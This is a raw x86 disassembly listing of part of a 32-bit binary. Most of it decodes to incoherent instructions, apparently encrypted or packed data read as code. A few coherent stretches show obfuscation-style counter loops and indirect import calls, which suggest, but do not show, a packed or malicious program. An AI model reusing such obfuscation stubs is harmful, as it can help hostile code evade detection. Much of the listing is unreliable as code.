  40af54:	rol    DWORD PTR [ebx+0x20],0xdb
  40af58:	add    BYTE PTR [eax],cl
  40af5a:	jecxz  0x40af6f
  40af5c:	aad    0x9d
  40af5e:	mov    DWORD PTR [eax],esp
  40af60:	int    0xf1
  40af62:	retf   0x2599
  40af65:	push   eax
  40af66:	test   al,0x1d
  40af68:	add    eax,DWORD PTR [ebp+edx*2-0x17]
  40af6c:	not    DWORD PTR [ecx+0x1e6091a]
  40af72:	call   0xa52334ae
  40af77:	adc    eax,0xd66ab509
  40af7c:	sbb    bh,BYTE PTR [edx+0x1bb6f331]
  40af82:	fwait
  40af83:	inc    ecx
  40af84:	es xchg ecx,esi
  40af87:	ds in  al,dx
  40af89:	jmp    0x40af97
  40af8b:	fstp   DWORD PTR [ecx+ecx*4-0x7b7f9212]
  40af92:	mov    ecx,esi
  40af94:	adc    al,0xf9
  40af96:	int3   
  40af97:	inc    eax
  40af98:	popa   
  40af99:	dec    ecx
  40af9a:	mov    DWORD PTR [edi+edi*2+0x7ba5b5c7],esp
  40afa1:	adc    eax,0xeeaa5995
  40afa6:	jle    0x40af33
  40afa8:	lods   eax,DWORD PTR ds:[esi]
  40afa9:	add    ebx,edi
  40afab:	mov    edi,0x57b86e0d
  40afb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afb1:	jbe    0x40af8b
  40afb3:	aaa    
  40afb4:	cmp    edx,0x39
  40afb7:	push   ebp
  40afb8:	ds sub cl,bl
  40afbb:	sbb    eax,0xd28deda1
  40afc0:	in     al,dx
  40afc1:	jmp    0x1252:0x7da2210e
  40afc8:	in     al,dx
  40afc9:	loopne 0x40aff2
  40afcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afcc:	jnp    0x40b044
  40afce:	push   0x65
  40afd0:	cdq    
  40afd1:	outs   dx,BYTE PTR ds:[esi]
  40afd2:	xchg   edx,ecx
  40afd4:	dec    esp
  40afd5:	push   ss
  40afd6:	or     BYTE PTR [edi],0xbd
  40afd9:	mov    dl,0x54
  40afdb:	mov    dh,0x3f
  40afdd:	xor    al,dl
  40afdf:	(bad)
  40afe3:	dec    ecx
  40afe4:	scas   al,BYTE PTR es:[edi]
  40afe5:	aad    0x49
  40afe7:	or     cl,dl
  40afe9:	xor    eax,0x4dc46ac5
  40afee:	mov    cl,0x26
  40aff0:	xchg   ebp,eax
  40aff1:	adc    al,0x65
  40aff3:	pop    edx
  40aff4:	or     dh,bl
  40aff6:	fcomp  DWORD PTR [eax]
  40aff8:	(bad)  [ecx+0x5e]
  40affb:	xor    DWORD PTR [ecx+0x75426d7a],esi
  40b001:	mov    ah,0xa3
  40b003:	leave  
  40b004:	es or  al,0x12
  40b007:	or     ecx,edx
  40b009:	nop
  40b00a:	dec    esi
  40b00b:	test   DWORD PTR [eax],esp
  40b00d:	es cmp al,0xdd
  40b010:	pop    esp
  40b011:	loop   0x40b066
  40b013:	scas   al,BYTE PTR es:[edi]
  40b014:	jne    0x40b00e
  40b016:	dec    ecx
  40b017:	cmp    DWORD PTR [esi],edx
  40b019:	je     0x40b015
  40b01b:	and    al,BYTE PTR [edi-0x58]
  40b01e:	scas   al,BYTE PTR es:[edi]
  40b01f:	loop   0x40afee
  40b021:	scas   eax,DWORD PTR es:[edi]
  40b022:	lock idiv BYTE PTR [edi+0x567fe51d]
  40b029:	sbb    al,0x36
  40b02b:	mov    cx,0xe8f1
  40b02f:	dec    eax
  40b030:	add    esp,DWORD PTR [eax+edi*8+0x56dfd5ae]
  40b037:	xchg   ebp,eax
  40b038:	ds imul esi,esp,0x70b0c229
  40b03f:	jnp    0x40afea
  40b041:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b042:	rcl    BYTE PTR [eax+0x5f],1
  40b045:	ss sbb al,0x54
  40b048:	or     al,0xe6
  40b04a:	fcmovb st,st(0)
  40b04c:	(bad)
  40b04f:	dec    esp
  40b050:	adc    eax,0xdb788fbb
  40b055:	mov    WORD PTR [ecx-0x26e80e27],gs
  40b05b:	cmp    BYTE PTR [edi-0x1e],0x30
  40b05f:	test   BYTE PTR [esi],al
  40b061:	into   
  40b062:	mov    dl,0x3
  40b064:	pop    ss
  40b065:	mov    edi,0x2249802c
  40b06a:	fiadd  DWORD PTR [eax]
  40b06c:	stos   BYTE PTR es:[edi],al
  40b06d:	or     esi,DWORD PTR [esi+0x7fbb2b17]
  40b073:	mov    ds:0x6c8dd40c,eax
  40b078:	push   esi
  40b079:	lods   eax,DWORD PTR ds:[esi]
  40b07a:	xchg   DWORD PTR [ebp+ebp*4+0x55ec665d],ebx
  40b081:	repnz and eax,0x5bb530ab
  40b087:	nop
  40b088:	mov    bh,al
  40b08a:	cmp    al,0x42
  40b08c:	mov    cx,0xf9b2
  40b090:	mov    ch,0x43
  40b092:	push   edx
  40b093:	push   esp
  40b094:	fcomp  DWORD PTR [ebx-0x65]
  40b097:	outs   dx,BYTE PTR es:[esi]
  40b099:	repnz push ebx
  40b09b:	lahf   
  40b09c:	xor    eax,edx
  40b09e:	xor    esi,edx
  40b0a0:	add    eax,ecx
  40b0a2:	add    esi,ecx
  40b0a4:	imul   eax,esi
  40b0a7:	mov    esi,DWORD PTR [ebp+0xc]
  40b0aa:	cmp    esi,eax
  40b0ac:	mov    eax,DWORD PTR [ebp-0x4]
  40b0af:	je     0x40aa89
  40b0b5:	xor    eax,edx
  40b0b7:	add    eax,ecx
  40b0b9:	mov    ecx,DWORD PTR [ebp+0xc]
  40b0bc:	imul   eax,ecx
  40b0bf:	add    eax,DWORD PTR [ebp+0x8]
  40b0c2:	mov    DWORD PTR [ebp+0xc],eax
  40b0c5:	mov    eax,DWORD PTR [ebp+0xc]
  40b0c8:	jmp    0x40b2c3
  40b0cd:	fadd   QWORD PTR [edi-0x18]
  40b0d0:	(bad)  
  40b0d1:	ins    DWORD PTR es:[edi],dx
  40b0d2:	jns    0x40b0d0
  40b0d4:	pop    ebp
  40b0d5:	xchg   BYTE PTR [ebx+0xb],cl
  40b0d8:	xor    dh,BYTE PTR [esi+esi*2]
  40b0db:	test   al,0x6f
  40b0dd:	popf   
  40b0de:	loop   0x40b15e
  40b0e0:	jle    0x40b13e
  40b0e2:	jg     0x40b162
  40b0e4:	jle    0x40b0d5
  40b0e6:	push   0x8ff277d0
  40b0eb:	and    al,dh
  40b0ed:	lea    esi,[ebx]
  40b0ef:	out    0x40,al
  40b0f1:	call   0xe3361535
  40b0f6:	jl     0x40b143
  40b0f8:	mov    BYTE PTR [ebp+edx*8+0x71],0x39
  40b0fd:	sbb    BYTE PTR [edi-0x3fe36c0a],bh
  40b103:	ins    BYTE PTR es:[edi],dx
  40b104:	test   DWORD PTR [eax+0x67],ebp
  40b107:	sub    DWORD PTR [ebx-0x212c4214],ebx
  40b10d:	in     al,0x93
  40b10f:	stc    
  40b110:	add    al,0xe7
  40b112:	in     eax,0x9d
  40b114:	inc    eax
  40b115:	mov    ah,0xa6
  40b117:	add    BYTE PTR [ecx+0x57],al
  40b11a:	(bad)  
  40b11b:	test   eax,0x437fb0e3
  40b120:	into   
  40b121:	ret    0x2aa3
  40b124:	inc    ebp
  40b125:	or     bh,bh
  40b127:	push   esp
  40b128:	pop    ebp
  40b129:	sbb    bl,BYTE PTR [edx]
  40b12b:	sbb    al,0xc8
  40b12d:	fst    st(6)
  40b12f:	stc    
  40b130:	dec    ecx
  40b131:	sbb    edx,DWORD PTR [edi-0x1b]
  40b134:	jae    0x40b116
  40b136:	lods   eax,DWORD PTR ds:[esi]
  40b137:	shr    DWORD PTR [ecx],0xdb
  40b13a:	ja     0x40b0ce
  40b13c:	pop    eax
  40b13d:	into   
  40b13e:	cld    
  40b13f:	xor    DWORD PTR [ecx+0x31465844],ecx
  40b145:	jnp    0x40b184
  40b147:	jl     0x40b113
  40b149:	gs cwde 
  40b14b:	cmp    BYTE PTR [ebp+eiz*1+0x4a],bh
  40b14f:	mov    WORD PTR [esi+0x54cef38f],fs
  40b155:	(bad)  
  40b156:	test   al,0xdc
  40b158:	jo     0x40b1cb
  40b15a:	fs das 
  40b15c:	push   esi
  40b15d:	es lock mov edi,0x574bf2da
  40b164:	fcomp  QWORD PTR [ebp-0x60]
  40b167:	push   sp
  40b169:	cmp    bl,bh
  40b16b:	xchg   edx,eax
  40b16c:	fidivr DWORD PTR [eax+0x17]
  40b16f:	push   ebp
  40b170:	jns    0x40b153
  40b172:	push   ss
  40b173:	sub    DWORD PTR [edi-0x50f5099e],esp
  40b179:	sub    ch,BYTE PTR [eax]
  40b17b:	push   ebx
  40b17c:	adc    DWORD PTR [ecx+0x219ddccb],esi
  40b182:	xor    BYTE PTR [edi],ah
  40b184:	dec    DWORD PTR [ecx-0x29872c01]
  40b18a:	sbb    BYTE PTR [edi+0x6fb321fa],dh
  40b190:	xchg   edi,eax
  40b191:	loop   0x40b191
  40b193:	adc    ah,BYTE PTR [eax]
  40b195:	je     0x40b11b
  40b197:	jmp    DWORD PTR [edi+eiz*4]
  40b19a:	add    BYTE PTR [ecx+0x7f8f51b3],bh
  40b1a0:	push   0x7250dd4f
  40b1a5:	loope  0x40b1d3
  40b1a7:	mov    ebx,0x75f04989
  40b1ac:	loop   0x40b1fc
  40b1ae:	jne    0x40b181
  40b1b0:	fld    QWORD PTR ds:0x4a2e01b5
  40b1b6:	sbb    DWORD PTR [esi-0x1e],0x1fd2f4d4
  40b1bd:	fimul  WORD PTR [ebx+0xd]
  40b1c0:	sar    DWORD PTR [edx+0x481a6fd],cl
  40b1c6:	call   0x1b51:0x602ee203
  40b1cd:	test   cl,ch
  40b1cf:	(bad)  
  40b1d0:	xchg   esi,eax
  40b1d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1d2:	popa   
  40b1d3:	push   esi
  40b1d4:	sub    dh,dh
  40b1d6:	mov    ?,WORD PTR [ebx-0x8]
  40b1d9:	dec    ebx
  40b1da:	or     ebx,edx
  40b1dc:	push   esi
  40b1dd:	in     eax,0xe
  40b1df:	adc    ecx,DWORD PTR [ecx]
  40b1e1:	or     BYTE PTR [ebx],ch
  40b1e3:	int3   
  40b1e4:	jmp    0xb7b940ea
  40b1e9:	push   eax
  40b1ea:	lock inc eax
  40b1ec:	fdiv   DWORD PTR [edx]
  40b1ee:	and    esp,DWORD PTR [esi]
  40b1f0:	dec    ecx
  40b1f1:	push   es
  40b1f2:	sub    esp,DWORD PTR [ebx+esi*4-0xd]
  40b1f6:	cli    
  40b1f7:	js     0x40b21a
  40b1f9:	das    
  40b1fa:	dec    esi
  40b1fb:	fwait
  40b1fc:	sub    dh,BYTE PTR [ecx+edx*4]
  40b1ff:	cmp    al,0x90
  40b201:	and    DWORD PTR [ecx+eax*1-0x7d1baf5a],ebx
  40b208:	or     eax,0x2eba2a50
  40b20d:	aas    
  40b20e:	sub    al,0x4c
  40b210:	jo     0x40b192
  40b212:	pop    ds
  40b213:	fcom   QWORD PTR [edx+0x76bdc6ea]
  40b219:	arpl   WORD PTR [ecx+0x1de697fd],sp
  40b21f:	cmp    eax,0xee2407b4
  40b224:	and    al,0x8b
  40b226:	xchg   edx,eax
  40b227:	jp     0x40b27d
  40b229:	sub    eax,0x67c89e7b
  40b22e:	or     DWORD PTR [edx-0x31054ae0],0xc5af5326
  40b238:	rcl    BYTE PTR es:[ebx-0x37f72cf0],cl
  40b23f:	pop    ss
  40b240:	mov    BYTE PTR [edx+0x6eeb494f],dl
  40b246:	xor    BYTE PTR [ecx],bl
  40b248:	mov    eax,0x144e5106
  40b24d:	ret    0x4187
  40b250:	mov    es,WORD PTR ds:0x782a44a7
  40b256:	shl    ch,1
  40b258:	sbb    DWORD PTR [eax],edi
  40b25a:	mov    cs,WORD PTR [ecx]
  40b25c:	popf   
  40b25d:	scas   eax,DWORD PTR es:[edi]
  40b25e:	into   
  40b25f:	ds dec edx
  40b261:	fiadd  DWORD PTR [edx+edx*2]
  40b264:	sti    
  40b265:	inc    edi
  40b266:	popf   
  40b267:	int    0x25
  40b269:	aaa    
  40b26a:	sub    esi,DWORD PTR [ecx-0x2bdd69ce]
  40b270:	pop    es
  40b271:	xchg   ebx,eax
  40b272:	sbb    dh,ah
  40b274:	xchg   edi,eax
  40b275:	std    
  40b276:	aas    
  40b277:	xchg   edi,eax
  40b278:	lock test BYTE PTR [esp+ebx*2+0x38],0x5b
  40b27e:	push   eax
  40b27f:	pop    ss
  40b280:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b281:	sbb    al,0xab
  40b283:	loope  0x40b28e
  40b285:	pop    es
  40b286:	sub    al,0x9f
  40b288:	imul   edi,DWORD PTR [ebx+0x5dc15309],0xc254bcda
  40b292:	jmp    0xadd:0xc38a092f
  40b299:	sbb    al,0x43
  40b29b:	or     ch,BYTE PTR [ebp-0x5793d736]
  40b2a1:	cwde   
  40b2a2:	jbe    0x40b304
  40b2a4:	jecxz  0x40b2c0
  40b2a6:	out    0xc9,eax
  40b2a8:	sbb    bh,BYTE PTR [eax-0x3c03e555]
  40b2ae:	mov    esp,DWORD PTR [esi-0x17]
  40b2b1:	sbb    edi,0x39df7bfe
  40b2b7:	mov    dl,0x45
  40b2b9:	imul   edi,edi,0x3f56dbac
  40b2bf:	jmp    0x40b308
  40b2c1:	aaa    
  40b2c2:	fstp   QWORD PTR [esi-0x37]
  40b2c5:	ret    0x8
  40b2c8:	push   ebp
  40b2c9:	mov    ebp,esp
  40b2cb:	sub    esp,0x30
  40b2ce:	mov    eax,ds:0x43056e
  40b2d3:	mov    ecx,DWORD PTR ds:0x43057a
  40b2d9:	sub    ecx,eax
  40b2db:	imul   eax,DWORD PTR [eax+ecx*1]
  40b2df:	jmp    0x40b43d
  40b2e4:	adc    eax,0x6533e552
  40b2e9:	inc    ebp
  40b2ea:	and    eax,0x241ce54
  40b2ef:	scas   al,BYTE PTR es:[edi]
  40b2f0:	in     al,0x26
  40b2f2:	dec    ebx
  40b2f3:	cwde   
  40b2f4:	sti    
  40b2f5:	in     al,0x7e
  40b2f7:	jle    0x40b338
  40b2f9:	jg     0x40b379
  40b2fb:	jle    0x40b333
  40b2fd:	cwde   
  40b2fe:	cmp    DWORD PTR [esi*2+0x35d97510],esp
  40b305:	mov    eax,0xe8a1498f
  40b30a:	(bad)  
  40b30b:	mov    al,ds:0x8650a228
  40b310:	adc    al,0xd4
  40b312:	(bad)  
  40b313:	std    
  40b314:	mov    cl,dl
  40b316:	sub    eax,0xba6184fe
  40b31b:	stos   DWORD PTR es:[edi],eax
  40b31c:	ret    0xdaf1
  40b31f:	sahf   
  40b320:	cld    
  40b321:	mov    edi,0x40f2e2e7
  40b326:	push   eax
  40b327:	ret    0x2a0d
  40b32a:	push   ecx
  40b32b:	aaa    
  40b32c:	int    0xfd
  40b32e:	mov    eax,0x224c3f94
  40b333:	icebp  
  40b334:	sbb    al,0x34
  40b336:	or     DWORD PTR [edi-0x18],esi
  40b339:	pop    ds
  40b33a:	inc    esp
  40b33b:	xchg   ebp,eax
  40b33c:	dec    edi
  40b33d:	shr    BYTE PTR [eax+0x64ae267c],cl
  40b343:	std    
  40b344:	ins    DWORD PTR es:[edi],dx
  40b345:	pop    edx
  40b346:	jbe    0x40b349
  40b348:	inc    esi
  40b349:	fdivr  DWORD PTR [ebx-0x25]
  40b34c:	popf   
  40b34d:	fld    QWORD PTR [ebx-0xd]
  40b350:	push   cs
  40b351:	add    eax,0xd1b05fec
  40b356:	push   edi
  40b357:	sub    bl,bh
  40b359:	add    ebp,edi
  40b35b:	pop    eax
  40b35c:	pop    esp
  40b35d:	and    ecx,DWORD PTR [ebx]
  40b35f:	enter  0x4c6e,0x3c
  40b363:	xor    al,0xef
  40b365:	jmp    0x7c73:0x388b155b
  40b36c:	jl     0x40b34e
  40b36e:	xchg   edx,eax
  40b36f:	inc    ebx
  40b370:	test   eax,0x587fa739
  40b375:	xchg   esp,eax
  40b376:	adc    ebx,DWORD PTR [ebx+0x3f]
  40b379:	cdq    
  40b37a:	test   eax,0xeda917e2
  40b37f:	leave  
  40b380:	test   BYTE PTR [esi],dl
  40b382:	loope  0x40b3c6
  40b384:	or     al,0xc1
  40b386:	mov    WORD PTR [edi],cs
  40b388:	jae    0x40b3da
  40b38a:	add    eax,0x14446a2a
  40b38f:	cmp    eax,0xfdf2893a
  40b394:	xchg   esp,eax
  40b395:	jle    0x40b34a
  40b397:	mov    bh,ah
  40b399:	mov    al,0x7e
  40b39b:	push   esp
  40b39c:	in     al,dx
  40b39d:	sub    eax,0x1523bcbb
  40b3a2:	jno    0x40b3e4
  40b3a4:	sbb    BYTE PTR [ecx-0x5bc14e0e],bl
  40b3aa:	and    eax,0x6f5cd4f9
  40b3af:	push   ss
  40b3b0:	add    DWORD PTR [ebx-0x22607d13],eax
  40b3b6:	out    0xab,eax
  40b3b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3b9:	xor    eax,edi
  40b3bb:	dec    esp
  40b3bc:	lahf   
  40b3bd:	lahf   
  40b3be:	mov    ah,0xa8
  40b3c0:	cmp    esi,DWORD PTR [eax]
  40b3c2:	jecxz  0x40b3e3
  40b3c4:	lods   al,BYTE PTR ds:[esi]
  40b3c5:	outs   dx,BYTE PTR ds:[esi]
  40b3c6:	jbe    0x40b3b9
  40b3c8:	sbb    eax,0xcc2a3ed2
  40b3cd:	xor    eax,0x5d349b45
  40b3d2:	lods   al,BYTE PTR ds:[esi]
  40b3d3:	hlt    
  40b3d4:	xchg   DWORD PTR ds:0x1194d17b,ecx
  40b3da:	int    0x45
  40b3dc:	adc    BYTE PTR [esi-0x59],al
  40b3df:	ins    BYTE PTR es:[edi],dx
  40b3e0:	add    BYTE PTR [esi],dh
  40b3e2:	cli    
  40b3e3:	nop
  40b3e4:	fs mov esi,0xae7e8ac7
  40b3ea:	loop   0x40b447
  40b3ec:	ret    
  40b3ed:	ins    BYTE PTR es:[edi],dx
  40b3ee:	mov    ds:0xf2ef0887,al
  40b3f3:	arpl   WORD PTR [edx],cx
  40b3f5:	sbb    DWORD PTR [edx+0x32],0xffffffd9
  40b3f9:	cs popf 
  40b3fb:	mov    eax,0x7f32f40f
  40b400:	ret    
  40b401:	xchg   ecx,eax
  40b402:	jecxz  0x40b439
  40b404:	adc    bh,BYTE PTR [esp+eiz*4-0x35]
  40b408:	into   
  40b409:	and    ebx,edx
  40b40b:	cmp    dh,bl
  40b40d:	jb     0x40b467
  40b40f:	xchg   edx,eax
  40b410:	in     eax,dx
  40b411:	popf   
  40b412:	mov    ebp,0x292ca5ca
  40b417:	or     al,0xea
  40b419:	cmp    edi,esp
  40b41b:	mov    dh,0xc6
  40b41d:	cmp    DWORD PTR [esp+eax*2-0x59a22e01],esp
  40b424:	out    0x9c,al
  40b426:	in     al,dx
  40b427:	cld    
  40b428:	fwait
  40b429:	gs in  eax,0x5a
  40b42c:	pmaxub mm2,mm3
  40b42f:	je     0x40b414
  40b431:	inc    ecx
  40b432:	sbb    ah,BYTE PTR [edx+0x5f3f850e]
  40b438:	sbb    BYTE PTR [ecx],0xf4
  40b43b:	mov    dh,0xed
  40b43d:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40b444:	mov    DWORD PTR ds:0x43054e,0x11
  40b44e:	cmp    DWORD PTR ds:0x43054e,0x0
  40b455:	je     0x40b489
  40b45b:	cmp    DWORD PTR ds:0x43054e,0x19
  40b462:	jne    0x40b479
  40b468:	push   DWORD PTR [ebp-0x24]
  40b46b:	push   DWORD PTR [ebp-0x20]
  40b46e:	push   0x41ff
  40b473:	call   DWORD PTR ds:0x42eae8
  40b479:	mov    eax,ds:0x43054e
  40b47e:	dec    eax
  40b47f:	mov    ds:0x43054e,eax
  40b484:	jmp    0x40b44e
  40b489:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40b490:	or     eax,0x1c5c
  40b495:	mov    ecx,DWORD PTR [ebp-0x4]
  40b498:	push   ebx
  40b499:	add    DWORD PTR ds:0x4304ae,edi
  40b49f:	mov    eax,0x7510856
  40b4a4:	mov    ebx,DWORD PTR ds:0x430542
  40b4aa:	sbb    DWORD PTR ds:0x42e762,ebx
  40b4b0:	xor    ecx,eax
  40b4b2:	mov    ebx,DWORD PTR ds:0x42ee14
  40b4b8:	sub    DWORD PTR ds:0x43048e,ebx
  40b4be:	mov    ebx,0x32729d
  40b4c3:	xor    DWORD PTR ds:0x430546,0xece
  40b4cd:	add    ecx,ebx
  40b4cf:	xor    DWORD PTR ds:0x430496,0x42e76a
  40b4d9:	mov    DWORD PTR [ebp-0x1c],ecx
  40b4dc:	mov    ecx,DWORD PTR [ebp+0x14]
  40b4df:	xor    DWORD PTR ds:0x42ee1c,0x65f3
  40b4e9:	push   esi
  40b4ea:	sub    DWORD PTR ds:0x42e762,0x2022
  40b4f4:	push   edi
  40b4f5:	and    DWORD PTR ds:0x430546,0x430492
  40b4ff:	test   ecx,ecx
  40b501:	mov    DWORD PTR ds:0x42e75e,0x17b6
  40b50b:	je     0x40b58a
  40b511:	add    ecx,0x2345
  40b517:	mov    ecx,DWORD PTR [ebp+0x14]
  40b51a:	and    DWORD PTR ds:0x4304a6,0x0
  40b524:	jmp    0x40b536
  40b529:	mov    edi,DWORD PTR ds:0x4304a6
  40b52f:	inc    edi
  40b530:	mov    DWORD PTR ds:0x4304a6,edi
  40b536:	cmp    DWORD PTR ds:0x4304a6,0x1d
  40b53d:	jae    0x40b585
  40b543:	cmp    DWORD PTR ds:0x4304a6,0x4
  40b54a:	jne    0x40b560
  40b550:	push   0x42ee1c
  40b555:	push   0x6d9e
  40b55a:	call   DWORD PTR ds:0x42eaec
  40b560:	cmp    DWORD PTR ds:0x4304a6,0x3
  40b567:	jne    0x40b57a
  40b56d:	mov    edi,DWORD PTR ds:0x4304a6
  40b573:	inc    edi
  40b574:	mov    DWORD PTR ds:0x4304a6,edi
  40b57a:	jmp    0x40b529
  40b57f:	and    esi,0x3dcd
  40b585:	mov    ecx,DWORD PTR [ecx]
  40b587:	mov    DWORD PTR [ebp-0x1c],ecx
  40b58a:	movzx  esi,BYTE PTR ds:0x430492
  40b591:	xor    DWORD PTR ds:0x4304ba,esi
  40b597:	imul   edx,eax
  40b59a:	or     DWORD PTR ds:0x4304be,edx
  40b5a0:	mov    ecx,0x4573
  40b5a5:	xor    esi,DWORD PTR ds:0x430486
  40b5ab:	add    edx,ecx
  40b5ad:	mov    esi,0x7879
  40b5b2:	and    DWORD PTR ds:0x43053e,0x0
  40b5bc:	mov    edi,DWORD PTR ds:0x43053e
  40b5c2:	inc    edi
  40b5c3:	mov    DWORD PTR ds:0x43053e,edi
  40b5c9:	cmp    DWORD PTR ds:0x43053e,0x12
  40b5d0:	jne    0x40b5f7
  40b5d6:	push   0x1
  40b5d8:	push   0x3333
  40b5dd:	push   0x7164
  40b5e2:	push   0x26d7
  40b5e7:	push   0x1d14
  40b5ec:	push   0x64d6
  40b5f1:	call   DWORD PTR ds:0x42eaf0
  40b5f7:	cmp    DWORD PTR ds:0x43053e,0x11
  40b5fe:	jne    0x40b613
  40b604:	xor    edi,edi
  40b606:	or     edi,DWORD PTR ds:0x43053e
  40b60c:	inc    edi
  40b60d:	mov    DWORD PTR ds:0x43053e,edi
  40b613:	cmp    DWORD PTR ds:0x43053e,0x1f
  40b61a:	jb     0x40b5bc
  40b620:	dec    edi
  40b621:	mov    edi,0x1556
  40b626:	xchg   esi,ecx
  40b628:	sub    edx,edi
  40b62a:	xor    esi,esi
  40b62c:	jmp    0x40b78a
  40b631:	mov    ch,dh
  40b633:	add    esi,DWORD PTR [eax+0x7b]
  40b636:	aad    0x9d
  40b638:	jl     0x40b646
  40b63a:	mov    eax,0x80df4dc4
  40b63f:	stc    
  40b640:	pusha  
  40b641:	mov    esp,0x3f7e7ee5
  40b646:	jg     0x40b6c6
  40b648:	jle    0x40b65a
  40b64a:	je     0x40b651
  40b64c:	xchg   edi,eax
  40b64d:	pop    esp
  40b64e:	inc    ebx
  40b64f:	adc    eax,0x1965aa0e
  40b654:	cmp    dh,BYTE PTR [ecx]
  40b656:	sub    DWORD PTR [ebp-0x4dc195a1],ebx
  40b65c:	cmp    ecx,DWORD PTR [ecx-0x15b0bf1f]
  40b662:	retf   
  40b663:	push   esp
  40b664:	aaa    
  40b665:	pop    ecx
  40b666:	mov    edi,0x2d2e6955
  40b66b:	ret    
  40b66c:	(bad)  
  40b66d:	push   esi
  40b66e:	and    ch,0x36
  40b671:	inc    esi
  40b672:	(bad)  
  40b673:	jle    0x40b668
  40b675:	fstp   DWORD PTR es:[ebx-0x3e543904]
  40b67c:	cs jne 0x40b6a2
  40b67f:	test   DWORD PTR [edi],0x7708f5c3
  40b685:	popf   
  40b686:	lods   al,BYTE PTR ds:[esi]
  40b687:	aam    0x26
  40b689:	fcomp  QWORD PTR [ecx+0x1e]
  40b68c:	xchg   ecx,eax
  40b68d:	dec    ebp
  40b68e:	mov    ebp,0x7e30e04a
  40b694:	int3   
  40b695:	add    BYTE PTR [ebx-0x198fc3f9],al
  40b69b:	push   0xffffffc9
  40b69d:	xchg   ebp,eax
  40b69e:	add    ebx,0x11b0601f
  40b6a4:	sub    DWORD PTR [ecx-0x2122ea61],ecx
  40b6aa:	stc    
  40b6ab:	sbb    al,0x25
  40b6ad:	les    edi,FWORD PTR [ebp+0xc]
  40b6b0:	mov    edx,0xd679db41
  40b6b5:	pop    edx
  40b6b6:	test   al,0x8
  40b6b8:	cmp    bh,BYTE PTR [eax-0x6ad24fba]
  40b6be:	mov    dh,0x8a
  40b6c0:	mov    edx,0x3ab1b9ed
  40b6c5:	mov    fs,esp
  40b6c7:	psubb  mm6,QWORD PTR [ecx-0x59]
  40b6cb:	mov    ah,0x4
  40b6cd:	mov    esp,0xba15dbe0
  40b6d2:	dec    esp
  40b6d3:	pushf  
  40b6d4:	sub    BYTE PTR [esi-0x72c9b38c],0x13
  40b6db:	or     ecx,0x25d4ed8
  40b6e1:	sti    
  40b6e2:	lods   al,BYTE PTR ds:[esi]
  40b6e3:	aad    0xc3
  40b6e5:	xor    esp,edi
  40b6e7:	jnp    0x40b6e8
  40b6e9:	sbb    edx,DWORD PTR ds:0x24e4855f
  40b6ef:	mov    bh,0x98
  40b6f1:	xchg   esp,eax
  40b6f2:	je     0x40b67f
  40b6f4:	arpl   WORD PTR [ecx-0x38],bx
  40b6f7:	pop    edx
  40b6f8:	jle    0x40b730
  40b6fa:	stos   BYTE PTR es:[edi],al
  40b6fb:	fincstp 
  40b6fd:	(bad)  
  40b6fe:	lea    edi,[esi]
  40b700:	xor    dl,BYTE PTR [ebx+0x70]
  40b703:	or     DWORD PTR [edi+0x66160d74],0xfffffffa
  40b70a:	sti    
  40b70b:	repz aad 0xfd
  40b70e:	inc    ebx
  40b70f:	sbb    ecx,DWORD PTR [ecx-0x1f]
  40b712:	pop    ebp
  40b713:	sub    DWORD PTR [eax+0x7b7f72f],esi
  40b719:	adc    cl,BYTE PTR [ebp+0xc2d166f]
  40b71f:	or     eax,esi
  40b721:	mov    ecx,0x4e01c7a7
  40b726:	add    ch,BYTE PTR [ebx-0x50ebef96]
  40b72c:	pop    es
  40b72d:	in     eax,dx
  40b72e:	nop
  40b72f:	test   eax,0x73ce8551
  40b734:	mov    bh,0x24
  40b736:	jnp    0x40b6e5
  40b738:	mov    edx,0x40bbc9ce
  40b73d:	adc    al,0xeb
  40b73f:	jge    0x40b751
  40b741:	mov    ds:0xc42650bf,eax
  40b746:	into   
  40b747:	cmp    al,0xc5
  40b749:	inc    eax
  40b74a:	popa   
  40b74b:	mov    al,0xc9
  40b74d:	add    eax,0x4586e13f
  40b752:	push   0xffffff99
  40b754:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b755:	jnp    0x40b7ab
  40b757:	mov    ch,BYTE PTR [edx-0x39]
  40b75a:	pop    DWORD PTR [ebp+edx*8-0x2a]
  40b75e:	fstp   QWORD PTR [edx+0x55cf7fed]
  40b764:	push   0xffffffca
  40b766:	hlt    
  40b767:	ins    DWORD PTR es:[edi],dx
  40b768:	addr16 imul edx,esi,0x5526ef1b
  40b76f:	arpl   WORD PTR [eax+0x1700e33f],ax
  40b775:	sub    BYTE PTR [edi+0xc5e80b3],bh
  40b77b:	call   0xefdee054
  40b780:	dec    ebp
  40b781:	(bad)  
  40b782:	aad    0xc5
  40b784:	fldcw  WORD PTR [eax-0x18b5f81b]
  40b78a:	mov    DWORD PTR [ebp-0x28],esi
  40b78d:	and    DWORD PTR ds:0x4304b2,ebx
  40b793:	mov    DWORD PTR [ebp-0x2c],esi
  40b796:	or     ecx,DWORD PTR ds:0x430542
  40b79c:	jmp    0x40b8fa
  40b7a1:	gs inc edi
  40b7a3:	xor    eax,0x657cedde
  40b7a8:	pop    ebp
  40b7a9:	xchg   edx,eax
  40b7aa:	lods   al,BYTE PTR ds:[esi]
  40b7ab:	mov    al,ds:0x5ef0c297
  40b7b0:	sar    BYTE PTR [ebp-0x1a],0x7e
  40b7b4:	jle    0x40b7f5
  40b7b6:	jg     0x40b836
  40b7b8:	jle    0x40b7dd
  40b7ba:	jmp    0xecbe724a
  40b7bf:	xor    eax,0xcb01d6b4
  40b7c4:	ror    BYTE PTR [ebp+0x69ecc466],0x61
  40b7cb:	add    DWORD PTR [esp+ebx*8-0x35],edx
  40b7cf:	ss data16 loope 0x40b851
  40b7d3:	add    edx,esp
  40b7d5:	fnstcw WORD PTR [ebx]
  40b7d7:	call   0x5db6:0x6439f326
  40b7de:	imul   BYTE PTR [esi+0x15]
  40b7e1:	or     eax,0xe4f8b777
  40b7e6:	and    dl,BYTE PTR [edx]
  40b7e8:	mov    dh,BYTE PTR [edx+edi*4+0x488c2fc7]
  40b7ef:	dec    BYTE PTR [ecx+0x56aad927]
